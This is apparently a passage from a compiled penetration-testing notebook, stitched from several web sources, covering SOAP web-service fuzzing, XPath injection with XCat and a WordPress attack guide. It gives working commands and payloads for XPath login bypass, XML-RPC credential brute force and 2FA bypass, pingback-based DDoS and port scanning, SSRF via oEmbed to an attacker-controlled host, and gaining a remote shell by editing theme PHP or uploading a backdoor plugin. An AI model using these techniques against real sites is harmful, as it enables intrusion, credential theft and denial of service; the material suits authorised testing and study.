</login> 
Second Request 
<login> 
[[ PAGE 336 ]]
  <username> eviware</username> 
  <password>yesitdoes!2</password> 
</login> 
And so on... 
So what lockout do we choose? Well the usual is after three failed attempts we get locked out 
for a certain time, like 6-24 hours. One that is very interesting is the Geometrically Increased 
penalty; for each try you lockout time doubles; the first failed attempt gives you a 1 second 
delay, the second, 2, the third 4 and so on. This makes the penalty for an honest mistake very 
slight, and not very deterring you might think, but look at what happens later; after 25 failed 
attempts the lock out time is 225 seconds or as it is more commonly know; more than a year!. 
This makes robots or scripts unusable! 
  
 
Tip 6) Element Duplication 
Date: July 16, 2009 
Sometimes we might not be able to hack a Web Service directly, but we can deduce how the 
Web Service behaves by sending it unexpected XML. One way is sending double elements, like 
this: 
<login> 
  <username> eviware</username> 
  <password> s0ApU1R0ck5</password> 
  <password> s0ApU1R0ck5</password> 
</login> 
You might get a response like this 
<loginresponse> 
<error>password is allowed only once and must be at least 6 characters and at most 20 
characters.</error> 
</loginresponse> 
Also try that in several permutations: 
<login> 
  <username> eviware</username> 
  <username> eviware</username> 
  <password> s0ApU1R0ck5</password> 
  <password> s0ApU1R0ck5</password> 
[[ PAGE 337 ]]
</login> 
Or: 
<login> 
  <username> eviware</username> 
  <username> eviware</username> 
  <username> eviware</username> 
  <password> s0ApU1R0ck5</password> 
</login> 
Don't stop there! It is just a matter of cloning a TestStep and then changing it to be a new test. 
Try the unexpected. And Improvise! 
Next step is flipping this test... 
  
 
Tip 7) Element Omission 
Date: July 17, 2009 
lement Omission is quite similar to Element Duplication, but the opposite. Instead of having 
extra elements, we enter less elements in the request: 
<login> 
  <username> eviware</username> 
</login> 
To your surprise, you might be getting: 
<loginresponse> 
  <errror>element password is expected.</error> 
</loginresponse> 
You should do clone and change here as well, we'll try the orther way around: 
<login> 
  <password>s0ApU1R0ck5</password> 
</login> 
and without any elements at all: 
<login> 
</login> 
 
[[ PAGE 338 ]]
  
Tip 8) Malformed XML 
Date: July 20, 2009 
This one is fun; try different variations of the elements in the request: 
<login> 
  <user_name> eviware</username> 
  <pass_word> s0ApU1R0ck5</password> 
</login> 
or like this: 
<login> 
  <user> eviware</username> 
  <pass> s0ApU1R0ck5</password> 
</login> 
You might be surprised by the answer: 
<loginresponse> 
  <errror>element username is expected.</error> 
</loginresponse> 
also, send requests where the end elements afre missing 
<login> 
  <username>eviware<username> 
  <pass> s0ApU1R0ck5</password> 
</login> 
and the opposite; requests with missing start elements: 
<login> 
<user> eviware</username> 
  s0ApU1R0ck5</password> 
</login> 
Something to also malform is the namespaces. Let's look at how the pseudo code we've been 
using earlier actually would look: 
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:demo="http://demo.eviware.com"> 
  <soapenv:Header/> 
[[ PAGE 339 ]]
    <soapenv:Body> 
    <demo :login> 
      <demo:username> eviware</demo:username> 
      <demo:password> s0ApU1R0ck5</demo:password> 
    <demo :/login>   
  </soapenv:Body> 
</soapenv:Envelope> 
Now, let's change omit one of the name spaces: 
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:demo="http://demo.eviware.com"> 
  <soapenv:Header/> 
    <soapenv:Body> 
    <demo :login> 
      <username> eviware</demo:username> 
      <demo:password> s0ApU1R0ck5</demo:password> 
    <demo :/login>   
  </soapenv:Body> 
</soapenv:Envelope> 
as well as the reference to the namespace and have one quote to many 
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/""> 
  <soapenv:Header/> 
    <soapenv:Body> 
    <demo :login> 
      <username> eviware</demo:username> 
      <demo:password> s0ApU1R0ck5</demo:password> 
    <demo :/login>   
  </soapenv:Body> 
</soapenv:Envelope> 
 
Tip 9) Boom goes the Payload! 
Date: July 21, 2009 
[[ PAGE 340 ]]
Let's start with a quote from Steve Jobs: "Boom!". 
The basis for this test is simple; "The weirdest things happens with the weirdest content". 
Basically, what we'll do is simple, we'll fill up the contents of an element with a huge payload. 
But first do this slightly, let's assume you know that the user name is allowed to be 25 
characters. try what happens with 26; 
<login> 
  <username>eviware eviware eviware e</username> 
  <password>s0ApU1R0ck5</password> 
</login> 
We should also try 24 and 25 just for interest sake, we'll do the usual, clone a test and then 
change the message. 
That really should be handled correctly, but what happens when we enter a huge number of 
characters, a payload overload? 
<login> 
  <username> 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
[[ PAGE 341 ]]
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
[[ PAGE 342 ]]
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware  
  eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware eviware 
eviware 
  </username> 
  <password> s0ApU1R0ck5</password> 
</login> 
For demonstration purposes I kept the payload small, make the content of usernameHUGEand 
see what happens: 
2007-12-03 13:54:21,706 [Servlet.Engine.Transports : 0] FATAL WebService.CustomerService.  
Login  - Description: java.rmi.ServerException: RemoteException occurred in server thread;  
nested exception is:  
java.rmi.RemoteException: Error; nested exception is:  
java.rmi.RemoteException: Problem with Query; nested exception is:  
java.sql.SQLException: Could not insert new row into the table. Context:  
DataBaseRemote.getCusstomerData, customer=456789 Identity: eviware  
[[ PAGE 343 ]]
Details: java.rmi.ServerException: RemoteException occurred in server thread; nested 
exception  
is: To Long UserName, must be Maximum 24 Bytes 
The above is a slightly modified response in tests from a user in the community (with their 
permission of course). The actual response contained information about both the database 
and the application server as well as information about the ERP system built on top of it and 
the name of the Stored Procedure used. The test also had the nice effect that it ground the 
application server to a halt, making it vulnerable for attacks. 
  
 
  
Tip 10) XPath injection 
Now for the final tip, we're we'll end up where we started; XPath Injection. soapUI users 
probably knows about XPath since this is what we use for XPath assertions, when we transfer 
content and more. The reason why we use Xpath is because this the standard (and a very 
powerful) way to access and and query XML documents, "SQL for XML". 
XPath injection then basically is like SQL injection in XML documents. Now, user data, for 
example, is seldom stored in XML Documents, so you might believe you are safe, but often the 
system you're testing is communicating with another system over Web Services. And what do 
we use to communicate, what do we send back and forth? XML documents... 
Now, when we know why, let's look at how. 
<login> 
  string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']) 
</login> 
We know that from the SQL Injection example, we're trying to let the system log us in. It might 
not work, but it is very interesting to see how the error has been handled. 
  
We can also try to tease the XPath processor in the target system; 
<login> 
  string(//user[user_name/text()='' or '1' = '1' and password/text()='' or '1' = '1']) 
</login> 
What happens when the XPath processor gets a faulty node? Will we get an error message 
directly from Xalan, Saxon, Microsoft's XPathNavigator? 
https://www.soapui.org/docs/soap-and-wsdl/tips-tricks/web-service-hacking/  
XPATH and XCAT 
XPath injection with XCat 
[[ PAGE 344 ]]
XCat is a tool written in Python 3, which can help you retrieve information using XPath 
injection vulnerabilities. It is not included by default in Kali Linux, but it can easily be added. 
You need to have Python 3 and pip installed in Kali Linux, and then just run the following in 
Terminal: 
apt-get install python3-pip 
pip3 install xcat 
Once XCat is installed, you need to be authenticated in bWAPP to get the vulnerable URL and 
cookie, so you can issue a command with the following structure: 
xcat -m <http_method> -c "<cookie value>" <URL_without_parameters> 
<injecable_parameter> <parameter1=value> <parameter2=value> -t 
"<text_in_true_results>"  
In this case, the command would be as follows: 
xcat -m GET -c 
"PHPSESSID=kbh3orjn6b2gpimethf0ucq241;JSESSIONID=9D7765D7D1F2A9FCCC5D972A043F
9867;security_level=0" ... 
The most interesting technique is that xcat can automate out of band attacks to massively 
speed up extraction of data. In English that means that it can turn a blind injection (where one 
request equals one bit of data) into a standard injection (where one request can result in many 
bits of data), essentially making the server send the data to XCat in big chunks. It also comes 
with a “file shell” option that allows you to access local files on the server through a variety of 
methods. You can find out how to install it in the documentation 
here: https://xcat.readthedocs.org/en/latest/ , and this post provides a summary of XCat’s 
capabilities. 
XPath? 
XPath is like SQL for XML. Imagine you had this XML document with a list of users: 
<root> 
 
<user username='Tom' password='pass'/> 
 
<user username='Jane' password='wyf'/> 
 
<user username='Steve' password='abcd'/> 
</root> 
And you wanted to query the existence of a particular user. You could write something like 
this: 
/root/user[@username="Tom"] 
That query would return the user node with the attribute ‘username’ set to ‘Tom’. There are 
lots of better examples on the Wikipedia page if you’re interested. 
XCat? 
[[ PAGE 345 ]]
Imagine if the query above was part of a form, and the code puts unescaped user input into 
the username part of the query. If the query finds a result it redirects you somewhere, 
otherwise it displays an error. An attacker could subvert the query by adding his own logic: 
/root/user[@username="Tom" and @password="pass" and "1"="1"] 
Now the form will only redirect if the user Tom’s password is equal to “pass”. Someone 
malicious could simply enumerate through common passwords until the form redirects, at 
which point they know Tom’s password. XCat is built to automate this, but it takes it a step 
further by being able to extract any portion of the document being queried through the 
injection flaw as efficiently as possible. XCat can also be used to read arbitrary XML and text 
files on the server - in the demo below we read an XML file, a secret text file and /etc/passwd. 
Example command 
You need to supply XCat with some information before it can exploit an injection flaw. It needs 
to know the HTTP method, the URI of the page, some data which triggers a True or False page, 
the vulnerable parameter and a match string. In the example below that is used in the demo 
the vulnerable parameter is “title”, and if the query is successful (i.e evaluates to true) the 
resulting page will have “1 results found” inside the contents. 
xcat --method=GET https://localhost:8080 "title=Foundation" title "1 results found" run 
retrieve 
Using just this information XCat can retrieve the whole XML document being queried. For XCat 
to read local files and speed up retrieval it needs to know how to connect back to your local 
machine, which means you need a public IP address. In the video below I use the –public-
ip flag to specify “localhost” as my address as I am running the example site on my local 
machine. You can set it to “autodetect” and XCat will automatically detect your public 
IP. Note: Maximize the demo (bottom right) if you can’t see all the commands. 
https://tomforb.es/exploiting-xpath-injection-vulnerabilities-with-xcat/  
Wordpress PenTest 
WordPress Penetration Testing: Getting Ready 
In order to start testing your WordPress site for vulnerabilities, you need to set up the 
environment first. So, when it comes to WordPress security audit or any other kind of pentest, 
Kali Linux is considered the holy grail. The reason being that Kali provides a huge amount of 
hacking tools for free. 
Therefore, first, we need to install Kali Linux on a system to pentest our WordPress site. 
Multiple approaches can be followed for this as Kali can be installed on a virtual box, a PC, or 
even an Android phone! However, for this article, we shall be using the virtual box. It is 
noteworthy here that in a real attack scenario, using Virtual Box to obtain reverse shell can 
become tricky due to multiple port forwarding involved. 
[[ PAGE 346 ]]
 
[[ PAGE 347 ]]
Installing Kali Linux for WordPress Security Audit 
• 
Step1: Download and install the latest version of Virtual box or any other emulator of 
your choice. 
• 
Step2: Now download and install the latest version of Kali Linux on Virtual Box for 
WordPress penetration testing. 
• 
Step3: Post-installation doesn’t forget to install certain “guest addition” tools with 
the help of this article. 
• 
Step4: If you still face any troubles with installing Kali on a VM, use the Kali VM image. 
Now once, we have installed Kali, it is time to go for WordPress penetration testing. However, 
before conducting a security audit of a WordPress site, it is necessary to seek the permission of 
the related authority. 
Related blog – Detailed Sample Penetration Testing Report 
Seeking Consent for WordPress Penetration Testing 
Before actively attacking a target, it is important that you take permission and get a contract 
signed from the respective WordPress site owner. In case you fail to do so, legal complications 
may arise. You might even have to face jail time depending on the country and the cyber laws 
where the target is located. Moreover, the tools of Kali come with a warning that they should 
be run only after getting approval from the target or for educational purposes only. Once all 
this is done, make sure to draft a good agreement with the help of a cybersecurity lawyer. 
Further, there are certain proactive steps that can be taken to avoid complications: 
• 
It is common wisdom to use virtual machines as much as possible for WordPress 
security audits to avoid complications. 
• 
In case you host a WordPress site on a third-party server, you may need the consent of 
the hosting provider before conducting a WordPress security audit on your own site! 
• 
Trying to find vulnerabilities beyond your authorized resources may lead to a felony. 
Avoid accidentally testing unauthorized resources like routers owned by a different 
company. 
The Three Steps of WordPress Penetration Testing 
WordPress Penetration Testing: Mapping 
The first step towards WordPress penetration testing while using the “Black Box” approach is 
gathering as much information about the target as possible. This is known as Mapping or 
Reconnaissance. This can be done through a variety of tools. Let us take a look at some of 
them. 
NMAP 
NMAP a.k.a ‘Network Mapper’ offers a wide variety of flexibility while mapping a target for 
WordPress security audit. Not only can NMAP scan ports and fingerprint backend technologies, 
but it can also evade firewalls to scan stealthily, use NSE scripts for automatic vulnerability 
discovery and so much more! 
To access this tool, simply open the command line terminal on your Kali Linux and type: 
[[ PAGE 348 ]]
nmap 
Doing so would open the help interface of this tool containing all the key features. Now let us 
take a look at a live target. In the image given below, Nmap scans the 
domain scanme.nmap.org which is provided by the Nmap site to test this tool. 
Related article: How to Fix WordPress Account Suspension by Host? 
 
The ‘-A’ option of Nmap means enabling OS detection, version detection, script scanning, and 
traceroute. Thereafter, the -T option helps Nmap to fine-grain the timing controls. The number 
4 means an aggressive scan. Finally, Nmap has provided us with the following info: 
• 
Open ports along with the services running on them i.e. port 80 are open with Apache 
2.0.52 running. 
• 
The operating system running on the target machine that is Linux 2.6.0-2.6.11. Along 
with the uptime of the server. 
Thereafter, Nmap has also consecutively scanned our internal machine named ‘d0ze’ with 
Local IP 192.168.12.3. This scan has also revealed the Open ports along with their services and 
OS. Not only this, but Nmap has also enumerated the MAC address of this local machine. This 
[[ PAGE 349 ]]
is just the tip of the iceberg as Nmap can perform a wider variety of tasks. Apart from Nmap, 
some other popular tools for mapping site for WordPress security audit are: 
Zenmap 
If beginners find trouble using Nmap, a GUI alternative of Nmap known as Zenmap can be used 
for automation. 
 
ReconDog 
Another good tool available on Github for black-box mapping is Recondog. Its description calls 
it a “Reconnaissance Swiss Army Knife”. It uses a mixture of OSINT and Mapping for WordPress 
security audits. 
 
Open Source Intelligence (OSINT) 
Moreover, other info about the target to conduct a WordPress security audit can be gathered 
from the public domain. Information like: 
[[ PAGE 350 ]]
• 
Number of Subdomains available. 
• 
Nameservers. 
• 
Ownership info and emails of employees(for social engineering attacks). 
• 
Geolocation. 
The resources that can be used for gathering OSNIT are: 
• 
Whois.com 
• 
Socialmention.com 
• 
recon-ng (Kali Linux tool) 
• 
theharvester (Kali Linux tool) 
• 
Shodan search engine 
• 
Netcraft 
• 
Dark Web Sites: 
• 
http://onion.city/ 
• 
https://ahmia.fi/search/ 
• 
http://thehiddenwiki.org/ 
• 
http://xmh57jrzrnw6insl.onion/ (Torch a.k.a. The Tor Search) 
WPintel Chrome Plugin 
You can use a WordPress Vulnerability scanner plugin like WPintel to scan your WordPress site 
for vulnerabilities, version, themes, plugins, and even enumerate users. 
Need a complete WordPress security audit?. Drop us a message on the chat widget, and we’d 
be happy to help you fix it. Help me with my WordPress Penetration Testing now. 
WordPress Penetration Testing: Discovery 
Post mapping all the technologies, it is now time for finding active vulnerabilities to conduct a 
WordPress security audit. The discovery part focuses on system-specific vulnerability 
discovery. In our case, the target uses WordPress so, we shall see all the tools that can be used 
for WordPress vulnerability discovery. Apart from WordPress, if the target is using other CMS 
or other systems, even then some specific tools can be used for finding vulnerabilities. 
Related article: WordPress Backdoor Hack: Symptoms, Finding & Fixing 
WPScan 
WP scan a free tool that can be used to conduct a WordPress security audit. Designed with 
WordPress security in mind, this tool is a great choice for black-box testing of your WordPress 
site. This tool keeps a vulnerability database of WordPress and keeps updating it from time to 
time. Not only core WordPress but, this tool can scan for vulnerabilities in WordPress plugins 
and themes too. 
[[ PAGE 351 ]]
 
As shown in the image above, this tool first updates the vulnerability database before 
performing discovery on the target. 
To use this tool. Open the terminal in your Kali Linux and type: 
wpscan --url www.example.com 
This simple command will scan the target for vulnerabilities. This is just one example, for more 
help, on your terminal type: ‘wpscan -h’. This tool can also be used for: 
• 
WordPress login brute force. 
• 
User Enumeration on WordPress. 
• 
Enumerating WordPress themes and Plugins. 
• 
Finding default WordPress directories. 
Nikto 
Nikto is a great open-source vulnerability scanner to conduct a WordPress security audit. It can 
scan multiple kinds of servers and is very comprehensive. However, the downside of Nikto is 
that it takes too much time and makes too much noise. Therefore, Nikto is easily detectable of 
a WAF or IDS. Moreover, Nikto also generates many false positives that need to be vetted 
manually for WordPress penetration testing. For more options type “nikto -H“ 
[[ PAGE 352 ]]
 
Burp Suite 
Burp Suite is a great collection of tools that can significantly ease the process of WordPress 
security audits. It can act as a proxy between the browser and the server. Therefore, all the 
HTTP requests can be manipulated in real-time to find various kinds of vulnerabilities. Apart 
from this, the Burp suite also provides various automatic tools for paid users only. The free 
edition of the Burp suite is good for manual testing. 
 
Fuzzing 
Fuzzing is the last resort in WordPress security audit when nothing seems to work. It basically 
sends a large number of random characters to the parameters of your WordPress site. This can 
[[ PAGE 353 ]]
uncover even some zero-day flaws!. Although, fuzzing creates large noise which can be picked 
by IDS. Some lightweight fuzzing tools are: 
For SQL injection: For comprehensive fuzzing of WordPress to find SQLi 
vulnerabilities, Sqlmap is probably the best tool. Not only fuzzing but Sqlmap can also be used 
for the successful exploitation of an SQLi attack. Sqlamp can be used to enumerate databases 
on a vulnerable URL by the following command in Kali Linux: 
sqlmap -u "target URL" --dbs 
 
For XSS: XSSer can not only find but actively exploit XSS vulnerabilities. For more help type: 
‘xsser -h‘. And, for GUI, type: ‘xsser --gtk‘ 
[[ PAGE 354 ]]
XSSer GUI 
For Command Injection: Commix a.k.a. COMMand Injection eXploiter can detect and exploit 
various types of command injections during a WordPress security audit. For more help, in Kali 
Linux type: 
commix -h 
[[ PAGE 355 ]]
 
Other tools provided by Kali Linux for fuzzing during WordPress security audit are: 
• 
sfuzz 
• 
powerfuzzer 
• 
wfuzz 
WordPress Penetration Testing: Exploitation 
Post mapping and discovery, it is now time to identify exploitation points during a penetration 
testing. Trying the exploits can help us weed out the false positives. Though there are 
numerous frameworks for exploitation but for this article we shall only discuss one and its 
features. 
Metasploit 
Metasploit is an exploitation framework which can be used to exploit web apps, such as CMSes 
like WordPress. Developed and maintained by Rapid 7, Metasploit hosts a variety of exploits 
for different operating systems. First, update Metasploit before using it by running the 
‘msfupdate’ command in Kali Linux. Now, run Metasploit using the ‘msfconsole’ command. 
Some key parameters that need to be set in this tool are: 
• 
search: This feature can be used to search for WordPress related exploits 
• 
use exploit: Using this feature, a particular exploit related to WordPress can be 
uploaded i.e. use exploit/unix/webapp/wp_wpshop_ecommerce_file_upload 
• 
show options: This command list the parameters that need to be set thereafter. 
[[ PAGE 356 ]]
• 
set RHOST: This parameter needs the IP of the machine you wish to exploit. 
• 
TARGETURI: This parameter lists the file path of the target. 
• 
set exploit: This command finally runs the exploit. Alternatively, the ‘run’ command 
can also be used for this. 
 
https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress 
https://www.getastra.com/blog/security-audit/wordpress-penetration-testing/ 
Basic Information 
Uploaded files go to: _http://10.10.10.10/wp-content/uploads/2018/08/a.txt_\ __Themes 
files can be found in /wp-content/themes/, so if you change some php of the theme to get 
RCE you probably will use that path. For example: Using theme twentytwelve you 
can access the 404.php file in**:** /wp-content/themes/twentytwelve/404.php 
Another useful url could be: /wp-content/themes/default/404.php 
In wp-config.php you can find the root password of the database. 
Default login paths to check: /wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, 
/login/ 
Main WordPress Files 
• 
index.php 
• 
license.txt contains useful information such as the version WordPress installed. 
• 
wp-activate.php is used for the email activation process when setting up a new 
WordPress site. 
• 
Login folders (may be renamed to hide it): 
o 
/wp-admin/login.php 
o 
/wp-admin/wp-login.php 
o 
/login.php 
[[ PAGE 357 ]]
o 
/wp-login.php 
• 
xmlrpc.php is a file that represents a feature of WordPress that enables data to be 
transmitted with HTTP acting as the transport mechanism and XML as the encoding 
mechanism. This type of communication has been replaced by the WordPress REST 
API. 
• 
The wp-content folder is the main directory where plugins and themes are stored. 
• 
wp-content/uploads/ Is the directory where any files uploaded to the platform are 
stored. 
• 
wp-includes/ This is the directory where core files are stored, such as certificates, 
fonts, JavaScript files, and widgets. 
Post exploitation 
• 
The wp-config.php file contains information required by WordPress to connect to the 
database such as the database name, database host, username and password, 
authentication keys and salts, and the database table prefix. This configuration file can 
also be used to activate DEBUG mode, which can useful in troubleshooting. 
Users Permissions 
• 
Administrator 
• 
Editor: Publish and manages his and others posts 
• 
Author: Publish and manage his own posts 
• 
Contributor: Write and manage his posts but cannot publish them 
• 
Subscriber: Browser posts and edit their profile 
Passive Enumeration 
Get WordPress version 
Check if you can find the files /license.txt or /readme.html 
Inside the source code of the page (example 
from https://wordpress.org/support/article/pages/): 
• 
meta name 
 
• 
CSS link files 
 
• 
JavaScript files 
 
[[ PAGE 358 ]]
Get Plugins 
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | 
sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2 
Get Themes 
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | 
sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2 
Extract versions in general 
curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -
E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2 
Active enumeration 
Plugins and Themes 
You probably won't be able to find all the Plugins and Themes passible. In order to discover all 
of them, you will need to actively Brute Force a list of Plugins and Themes (hopefully for us 
there are automated tools that contains this lists). 
Users 
ID Brute 
You get valid users from a WordPress site by Brute Forcing users IDs: 
curl -s -I -X GET http://blog.example.com/?author=1 
If the responses are 200 or 30X, that means that the id is valid. If the the response is 400, then 
the id is invalid. 
wp-json 
You can also try to get information about the users by querying: 
curl http://blog.example.com/wp-json/wp/v2/users 
Only information about the users that has this feature enable will be provided. 
Also note that /wp-json/wp/v2/pages could leak IP addresses**.** 
XML-RPC 
If xml-rpc.php is active you can perform a credentials brute-force or use it to launch DoS 
attacks to other resources. (You can automate this process using this for example). 
To see if it is active try to access to /xmlrpc.php and send this request: 
Check 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall> 
[[ PAGE 359 ]]
 
Credentials Bruteforce 
wp.getUserBlogs, _wp.getCategories _ or metaWeblog.getUsersBlogs are some of the 
methods that can be used to brute-force credentials. If you can find any of them you can send 
something like: 
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>admin</value></param> 
<param><value>pass</value></param> 
</params> 
</methodCall> 
The message "Incorrect username or password" inside a 200 code response should appear if 
the credentials aren't valid. 
Also there is a faster way to brute-force credentials using system.multicall as you can try 
several credentials on the same request: 
 
Bypass 2FA 
This method is meant for programs and not for humans, and old, therefore it doesn't support 
2FA. So, if you have valid creds but the main entrance is protected by 2FA, you might be able 
to abuse xmlrpc.php to login with those creds bypassing 2FA. Note that you won't me able to 
[[ PAGE 360 ]]
perform all the actions you can do through the console, but you might still be able to get to 
RCE as Ippsec explains it in https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s 
DDoS or port scanning 
If you can find the method pingback.ping inside the list you can make the Wordpress send an 
arbitrary request to any host/port. 
This can be used to ask thousands of Wordpress sites to access one location (so a DDoS is 
caused in that location) or you can use it to make Wordpress lo scan some 
internal network (you can indicate any port). 
<methodCall> 
<methodName>pingback.ping</methodName> 
<params><param> 
<value><string>http://<YOUR SERVER >:<port></string></value> 
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string> 
</value></param></params> 
</methodCall> 
 
If you get faultCode with a value greater then 0 (17), it means the port is open. 
Take a look to the use of **system.multicall**in the previous section to learn how to abuse 
this method to cause DDoS. 
wp-cron.php DoS 
This file usually exists under the root of the Wordpress site: /wp-cron.php 
When this file is accessed a "heavy" MySQL query is performed, so I could be used 
by attackers to cause a DoS. 
Also, by default, the wp-cron.php is called on every page load (anytime a client requests any 
Wordpress page), which on high-traffic sites can cause problems (DoS). 
[[ PAGE 361 ]]
It is recommended to disable Wp-Cron and create a real cronjob inside the host that perform 
the needed actions in a regular interval (without causing issues). 
Bruteforce 
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>username</value></param> 
<param><value>password</value></param> 
</params> 
</methodCall> 
 
 
Using the correct credentials you can upload a file. In the response the path will appears 
(https://gist.github.com/georgestephanis/5681982) 
<?xml version='1.0' encoding='utf-8'?> 
<methodCall> 
 
<methodName>wp.uploadFile</methodName> 
[[ PAGE 362 ]]
 
<params> 
 
 
<param><value><string>1</string></value></param> 
 
 
<param><value><string>username</string></value></param> 
 
 
<param><value><string>password</string></value></param> 
 
 
<param> 
 
 
 
<value> 
 
 
 
 
<struct> 
 
 
 
 
 
<member> 
 
 
 
 
 
 
<name>name</name> 
 
 
 
 
 
 
<value><string>filename.jpg</string></value> 
 
 
 
 
 
</member> 
 
 
 
 
 
<member> 
 
 
 
 
 
 
<name>type</name> 
 
 
 
 
 
 
<value><string>mime/type</string></value> 
 
 
 
 
 
</member> 
 
 
 
 
 
<member> 
 
 
 
 
 
 
<name>bits</name> 
 
 
 
 
 
 
<value><base64><![CDATA[---base64-encoded-
data---]]></base64></value> 
 
 
 
 
 
</member> 
 
 
 
 
</struct> 
 
 
 
</value> 
 
 
</param> 
 
</params> 
</methodCall> 
DDOS 
<methodCall> 
    <methodName>pingback.ping</methodName> 
    <params> 
        <param><value><string>http://target/</string></value></param> 
[[ PAGE 363 ]]
        
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value>
</param> 
    </params> 
</methodCall> 
 
/wp-json/oembed/1.0/proxy - SSRF 
Try to access https://worpress-site.com/wp-
json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net and the 
Worpress site may make a request to you. 
This is the response when it doesn't work: 
 
SSRF 
{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %} 
This tool checks if the methodName: pingback.ping and for the path /wp-
json/oembed/1.0/proxy and if exists, it tries to exploit them. 
Automatic Tools 
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; 
rv:69.0) Gecko/20100101 Firefox/69.0" 
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection 
aggressive] --api-token <API_TOKEN> --passwords 
/usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found 
users and search for vulnerabilities using a free API token (up 50 searchs) 
#You can try to bruteforce the admin user using wpscan with "-U admin" 
Panel RCE 
[[ PAGE 364 ]]
Modifying a php from the theme used (admin credentials needed) 
Appearance → Editor → 404 Template (at the right) 
Change the content for a php shell: 
 
Search in internet how can you access that updated page. In thi case you have to access 
here: http://10.11.1.234/wp-content/themes/twentytwelve/404.php 
MSF 
You can use: 
use exploit/unix/webapp/wp_admin_shell_upload 
to get a session. 
Plugin RCE 
PHP plugin 
It may be possible to upload .php files as a plugin. 
Create your php backdoor using for example: 
 
Then add a new plugin: 
[[ PAGE 365 ]]
 
Upload plugin and press Install Now: 
 
Click on Procced: 
 
[[ PAGE 366 ]]
Probably this won't do anything apparently, but if you go to Media, you will see your shell 
uploaded: 
 
